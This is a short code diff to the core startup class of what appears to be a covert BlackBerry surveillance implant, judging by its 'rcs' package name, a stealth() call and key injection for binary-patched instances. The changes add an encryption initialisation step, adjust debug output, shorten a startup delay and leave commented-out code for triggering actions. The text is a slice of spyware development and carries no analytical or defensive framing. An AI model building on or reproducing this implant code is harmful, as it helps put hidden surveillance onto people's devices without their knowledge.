@@ -10,6 +10,7 @@ package com.ht.rcs.blackberry;
 
 import com.ht.rcs.blackberry.config.InstanceKeys323;
 import com.ht.rcs.blackberry.config.Keys;
+import com.ht.rcs.blackberry.crypto.Encryption;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 import com.ht.rcs.blackberry.utils.Utils;
@@ -33,10 +34,8 @@ public class Core {
 
         //#debug
         debug = new Debug("Core", DebugLevel.VERBOSE);
-
         // #debug
-        debug.init(true, false, true);
-        // #debug debug
+        debug.init(false, true, false);
          //#debug
         debug.trace("RCSBlackBerry launching");
 
@@ -48,12 +47,13 @@ public class Core {
         debug.trace("Antenna: " + antennaInstalled);
 
         if (!Keys.hasBeenBinaryPatched()) {
-            // #debug warn
             // #debug
             debug.warn("Not binary patched, injecting 323");
             InstanceKeys323.injectKeys323();
         }
 
+        Encryption.init();
+        
         Core core = new Core();
         boolean ret = core.run();
 
@@ -73,7 +73,7 @@ public class Core {
 
         stealth();
 
-        Utils.sleep(5000);
+        Utils.sleep(500);
 
         for (;;) {
             // #debug
@@ -85,7 +85,6 @@ public class Core {
                 Msg.show();
                 return false;
             } else {
-                // #debug debug
                  //#debug
                 debug.trace("TaskInit() OK");
                 // CHECK: Status o init?
@@ -93,7 +92,10 @@ public class Core {
                 Msg.show();
             }
 
-            // #debug info
+            //TODO togliere
+            // debug.warn("TRIGGERING ACTION 0");
+            //Status.getInstance().triggerAction(0);
+            
             // #debug
             debug.info("starting checking actions");
             if (taskObj.checkActions() == false) {
